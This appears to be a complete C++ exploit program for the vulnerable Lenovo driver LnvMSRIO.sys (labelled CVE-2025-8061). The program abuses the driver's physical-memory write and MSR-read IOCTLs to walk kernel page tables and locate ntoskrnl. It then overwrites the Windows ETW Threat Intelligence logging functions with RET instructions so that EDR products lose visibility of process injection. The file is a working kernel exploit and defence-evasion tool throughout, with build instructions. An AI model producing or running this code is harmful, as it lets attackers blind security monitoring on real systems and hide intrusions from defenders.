/*
 * 08_etw_patch.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — ETW-TI Kernel Patch
 *
 * Goal: blind the Windows ETW Threat Intelligence (ETW-TI) subsystem by
 *       overwriting the first byte of each ETW-TI dispatcher in ntoskrnl
 *       with 0xC3 (RET).  EDR kernel sensors that consume ETW-TI events
 *       (Defender ATP, CrowdStrike Falcon, SentinelOne…) lose visibility
 *       into the patched operation classes.
 *
 * Functions patched (all in ntoskrnl.exe):
 *   EtwTiLogReadWriteVm      — NtReadVirtualMemory  / NtWriteVirtualMemory
 *   EtwTiLogAllocFreeVm      — NtAllocateVirtualMemory / NtFreeVirtualMemory
 *   EtwTiLogMapUnmapView     — NtMapViewOfSection / NtUnmapViewOfSection
 *   EtwTiLogCreateUserThread — NtCreateThreadEx
 *   EtwTiLogProtectExec      — NtProtectVirtualMemory / NtCreateSection(exec)
 *   EtwTiLogDriverLoad       — driver load events (bonus)
 *
 * Technique
 * ─────────
 * 1. Physical scan of RAM → System _EPROCESS → DirectoryTableBase (CR3)
 * 2. ReadMSR(IA32_LSTAR = 0xC0000082) → KiSystemCall64 VA
 *    Walk backwards page-by-page for "MZ" signature → ntoskrnl base VA
 * 3. Page-table walk (CR3 → PML4 → PDPT → PD → PT) gives physical address
 *    for any kernel VA (VaToPa).
 * 4. KernelRead(cr3, va, buf, len) — combines VaToPa + PhysRead for
 *    multi-page virtual reads.
 * 5. Parse ntoskrnl PE export table → resolve each EtwTi* function VA.
 * 6. VaToPa(func_va) → PA, then PhysWriteU8(PA, 0xC3).
 *
 * _EPROCESS offsets (x64, Windows 10 19041 → Windows 11 26100+)
 * ──────────────────────────────────────────────────────────────
 *   +0x028  DirectoryTableBase  (CR3)
 *   +0x440  UniqueProcessId
 *   +0x5A8  ImageFileName       char[15]
 *
 * IOCTL layouts
 * ─────────────
 *   Phys read   0x9c406104  IN: { UINT64 PA; DWORD AS; DWORD Count }
 *                           OUT: AS × Count bytes
 *   Phys write  0x9c40a108  IN: { UINT64 PA; DWORD OT=1; DWORD AS; BYTE[AS] }
 *   MSR read    0x9c402084  IN: { DWORD Index; DWORD Reserved }
 *                           OUT: UINT64
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:08_etw_patch.exe 08_etw_patch.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ  0x9c406104u
#define IOCTL_PHYS_WRITE 0x9c40a108u
#define IOCTL_MSR_READ   0x9c402084u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical read ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn  { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE Data; };
struct MsrReadIn   { DWORD Index; DWORD Reserved; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

static bool ReadMSR(DWORD idx, uint64_t *out)
{
    MsrReadIn in = { idx, 0 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_MSR_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────

static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}

// ─── System CR3 via physical EPROCESS scan ────────────────────────────────────

static uint64_t GetSystemCR3()
{
    uint64_t top = PhysRamTop();
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (uint64_t pa = 0x100000; pa < top && !cr3; pa += 1<<20) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
        bool any_ok = false;
        for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
            if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
            else memset(buf+pg, 0, 0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
            if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
            if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
            uint64_t c = *(uint64_t*)(buf+off+0x028);
            if (c && !(c & 0xFFF)) { cr3 = c; break; }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── 4-level page table walk (VaToPa) ────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };

    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7))  // 1 GB page
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7))    // 2 MB page
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual read ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

// ─── ntoskrnl base from LSTAR ────────────────────────────────────────────────
//
// LSTAR holds KiSystemCall64.  Walk backward 0x1000 pages (16 MB max) looking
// for the MZ+PE signature of the ntoskrnl image header.

static uint64_t GetNtoskrnlBase(uint64_t cr3)
{
    uint64_t lstar = 0;
    if (!ReadMSR(0xC0000082, &lstar) || !lstar) return 0;

    uint64_t va = lstar & ~0xFFFULL;
    for (int i = 0; i < 0x1000; i++, va -= 0x1000) {
        uint8_t sig[2] = {};
        uint64_t pa = VaToPa(cr3, va);
        if (!pa) continue;
        if (!PhysRead(pa, sig, 2)) continue;
        if (sig[0] != 'M' || sig[1] != 'Z') continue;
        // Confirm it is a PE image (e_lfanew sanity)
        uint32_t e_lfanew = 0;
        uint64_t pa2 = VaToPa(cr3, va + 0x3C);
        if (!pa2) continue;
        PhysRead(pa2, &e_lfanew, 4);
        if (e_lfanew < 4 || e_lfanew > 0x800) continue;
        uint32_t pesig = 0;
        uint64_t pa3 = VaToPa(cr3, va + e_lfanew);
        if (!pa3) continue;
        PhysRead(pa3, &pesig, 4);
        if (pesig == IMAGE_NT_SIGNATURE) return va;
    }
    return 0;
}

// ─── Export resolver ──────────────────────────────────────────────────────────
//
// Reads up to 512 KB of the export directory section and iterates name entries.
// All RVAs stored in the export directory are image-relative (from base),
// so we subtract dir.VirtualAddress to get offsets within expbuf[].

static uint64_t GetExportVA(uint64_t cr3, uint64_t base, const char *name)
{
    // Read PE headers (first page)
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if (dos->e_lfanew + (int)sizeof(IMAGE_NT_HEADERS64) > (int)sizeof(hdrbuf)) return 0;
    auto *nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return 0;

    // Cap read at 512 KB — sufficient for ntoskrnl's full export table
    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!expbuf) return 0;

    KernelRead(cr3, base + dir.VirtualAddress, expbuf, expSize);
    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;

    uint64_t result = 0;
    DWORD base_rva = dir.VirtualAddress;

    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        DWORD offNamesEntry = exp->AddressOfNames - base_rva + i * 4;
        if (offNamesEntry + 4 > expSize) break;
        DWORD nameRva = *(DWORD*)(expbuf + offNamesEntry);
        DWORD nameOff = nameRva - base_rva;
        if (nameOff >= expSize) continue;

        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;

        DWORD offOrdinalsEntry = exp->AddressOfNameOrdinals - base_rva + i * 2;
        if (offOrdinalsEntry + 2 > expSize) break;
        WORD ord = *(WORD*)(expbuf + offOrdinalsEntry);

        DWORD offFuncsEntry = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        if (offFuncsEntry + 4 > expSize) break;
        DWORD funcRva = *(DWORD*)(expbuf + offFuncsEntry);
        result = base + funcRva;
    }

    VirtualFree(expbuf, 0, MEM_RELEASE);
    return result;
}

// ─── Patch one function with RET (0xC3) ──────────────────────────────────────

static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label)
{
    if (!func_va) {
        printf("  [~] %-42s  not exported (skipped)\n", label);
        return true;  // not a hard failure — may not exist on all builds
    }

    uint64_t pa = VaToPa(cr3, func_va);
    if (!pa) {
        printf("  [-] %-42s  VA=0x%016llX  VaToPa failed\n", label, func_va);
        return false;
    }

    uint8_t before = 0;
    PhysRead(pa, &before, 1);

    if (before == 0xC3) {
        printf("  [=] %-42s  VA=0x%016llX  already 0xC3\n", label, func_va);
        return true;
    }

    if (!PhysWriteU8(pa, 0xC3)) {
        printf("  [-] %-42s  VA=0x%016llX  write failed (%lu)\n",
               label, func_va, GetLastError());
        return false;
    }

    uint8_t after = 0;
    PhysRead(pa, &after, 1);
    bool ok = (after == 0xC3);
    printf("  [%s] %-42s  VA=0x%016llX  %02X→C3%s\n",
           ok ? "+" : "!",
           label, func_va, before,
           ok ? "" : "  [verify mismatch]");
    return ok;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 08 - ETW-TI Patch ===\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    // Step 1: System CR3
    printf("[*] Scanning for System EPROCESS / CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) {
        printf("[-] System CR3 not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3        = 0x%016llX\n\n", cr3);

    // Step 2: ntoskrnl base
    printf("[*] Locating ntoskrnl base via LSTAR...\n");
    uint64_t ntos = GetNtoskrnlBase(cr3);
    if (!ntos) {
        printf("[-] ntoskrnl base not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base     = 0x%016llX\n\n", ntos);

    // Step 3: resolve + patch
    static const char *targets[] = {
        "EtwTiLogReadWriteVm",        // NtRead/WriteVirtualMemory
        "EtwTiLogAllocFreeVm",        // NtAllocate/FreeVirtualMemory
        "EtwTiLogMapUnmapView",       // NtMapViewOfSection / NtUnmapViewOfSection
        "EtwTiLogCreateUserThread",   // NtCreateThreadEx
        "EtwTiLogProtectExec",        // NtProtectVirtualMemory / exec section
        "EtwTiLogDriverLoad",         // driver load (may not exist on all builds)
        nullptr
    };

    printf("[*] Patching ETW-TI functions (first byte → RET):\n");
    int patched = 0, failed = 0;
    for (int i = 0; targets[i]; i++) {
        uint64_t va = GetExportVA(cr3, ntos, targets[i]);
        if (PatchWithRet(cr3, va, targets[i])) patched++;
        else failed++;
    }

    printf("\n[+] Done.  patched=%d  failed=%d\n", patched, failed);
    if (failed == 0) {
        printf("[+] ETW-TI telemetry disabled — kernel EDR sensors are blind to:\n"
               "    ReadProcessMemory, WriteProcessMemory, VirtualAlloc,\n"
               "    MapViewOfSection, CreateRemoteThread, VirtualProtect\n");
    }

    CloseHandle(g_dev);
    return failed ? 1 : 0;
}
